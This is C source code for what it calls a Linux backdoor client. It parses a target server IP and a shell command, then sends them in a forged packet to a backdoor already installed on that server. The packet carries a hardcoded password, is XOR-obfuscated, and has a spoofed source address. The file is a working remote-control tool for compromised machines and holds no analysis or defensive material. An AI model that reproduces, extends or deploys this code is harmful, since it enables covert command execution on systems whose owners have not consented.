/*-----------------------------------------------------------------------------
 * backdoor-carl.h - Linux backdoor client (remote server control)
 * Copyright (C) 2010 Steffen L. Norgren <ironix@trollop.org>
 * 
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *----------------------------------------------------------------------------*/

#include "backdoor-carl.h"
#include "pkt_cap.h"
#include "utils.h"

/*-----------------------------------------------------------------------------
 * FUNCTION:    main 
 * 
 * DATE:        June 4, 2010
 * 
 * REVISIONS:   
 * 
 * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
 * 
 * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
 * 
 * INTERFACE:   int main(int argc, char **argv)
 *                  argc - argument count
 *                  argv - array of arguments
 * 
 * RETURNS:     Result on success or failure.
 *
 * NOTES: Main entry point into the program. Parses command-line arguments and
 *        configures the client.
 *
 *----------------------------------------------------------------------------*/
int main(int argc, char *argv[])
{
	char packet[MAX_PKT_LEN];

	/* make sure user is root */
	if (geteuid() != USER_ROOT) {
		fprintf(stderr, "Must be root to run this program.\n");
		exit(ERROR_NOTROOT);
	}

	/* parse CLI options */
	if (parse_options(argc, argv) == ERROR_OPTS) {
		err(1, "Invalid options");
		exit(ERROR_OPTS);
	}

	print_settings(argv[0]);

	/* raise privileges */
	if (set_root() == ERROR_NOTROOT) {
		err(1, "set_root");
	}

	sprintf(packet, "%s%s%s%s", PASSWORD, EXT_CMD_START, cli_vars.command, EXT_CMD_END);

	packet_forge(xor(packet), "216.187.76.2", cli_vars.server_ip);

	return 0;
}

/*-----------------------------------------------------------------------------
 * FUNCTION:    print_settings
 * 
 * DATE:        May 17, 2010
 * 
 * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
 * 
 * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
 * 
 * INTERFACE:   void print_settings(char *command)
 *                   command - the program's name
 * 
 * RETURNS: void
 * 
 * NOTES: Prints out the current settings that are being used in the current
 *        run of the application.
 *
 *----------------------------------------------------------------------------*/
void print_settings(char *command)
{
	fprintf(stderr, "Using the Following Options: (For help use \"%s -h\")\n", command);
	fprintf(stderr, "  Server's IP address:  %s\n", cli_vars.server_ip);
	fprintf(stderr, "  Sending command:      %s\n", cli_vars.command);
}

/*-----------------------------------------------------------------------------
 * FUNCTION:    print_usage
 * 
 * DATE:        May 18, 2010
 * 
 * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
 * 
 * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
 * 
 * INTERFACE:   void print_usage(char *command, int err)
 *                   command - the program's name
 *                   err - error produced
 * 
 * RETURNS: void
 * 
 * NOTES: Prints out the program's useage information if the user incorrectly
 *        entered an option or used the -h or --help option.
 *
 *----------------------------------------------------------------------------*/
void print_usage(char *command, int err)
{
    if (err == ERROR_OPTS_HELP) {
        fprintf(stderr, "usage: %s [arguments]\n\n", command);
        fprintf(stderr, "Arguments:\n");
        fprintf(stderr, "  -s       or  --server        Server's IP address\n");
        fprintf(stderr, "  -c 'cmd' or  --command 'cmd' Command to execute\n");
        fprintf(stderr, "  -h       or  --help          Prints out this screen\n");
		exit(ERROR_OPTS_HELP);
    }
	else if (err == ERROR_OPTS)
        fprintf(stderr, "Try `%s --help` for more information.\n", command);
	else {
        fprintf(stderr, "%s: unknown error\n", command);
        fprintf(stderr, "Try `%s --help` for more information.\n", command);
    }	
}

/*-----------------------------------------------------------------------------
 * FUNCTION:    parse_options 
 * 
 * DATE:        May 17, 2010
 * 
 * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
 * 
 * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
 * 
 * INTERFACE:   parse_options(int argc, char *argv[])
 *                    argc - argument count
 *                    argv - argument list
 * 
 * RETURNS:     ERROR_NONE on success ERROR_OPTS on failure.
 * 
 * NOTES: Sets default options and parses any command-line options.
 *
 *----------------------------------------------------------------------------*/
int parse_options(int argc, char *argv[])
{
	int c, option_index = 0;

	static struct option long_options[] =
	{
		{"server"		, required_argument	, 0, 's'},
		{"command"		, required_argument	, 0, 'c'},
		{"help"			, no_argument		, 0, 'h'},
		{0, 0, 0, 0}
	};

	/* set defaults */
	server = FALSE;

	if (argc != 5)
		print_usage(argv[0], ERROR_OPTS_HELP);

	/* parse options */
	while (TRUE) {
		c = getopt_long(argc, argv, "s:c:h", long_options, &option_index);

		if (c == -1)
			break;

		switch (c) {
			case 0:
				if (long_options[option_index].flag != 0)
					break;
				break;

			case 's':
				cli_vars.server_ip = optarg;
				break;

			case 'c':
				cli_vars.command = optarg;
				break;

			case 'h':
				print_usage(argv[0], ERROR_OPTS_HELP);
				break;			

			default:
				print_usage(argv[0], ERROR_OPTS);
				return ERROR_OPTS;
				break;
		}
	}

	return ERROR_NONE;
}
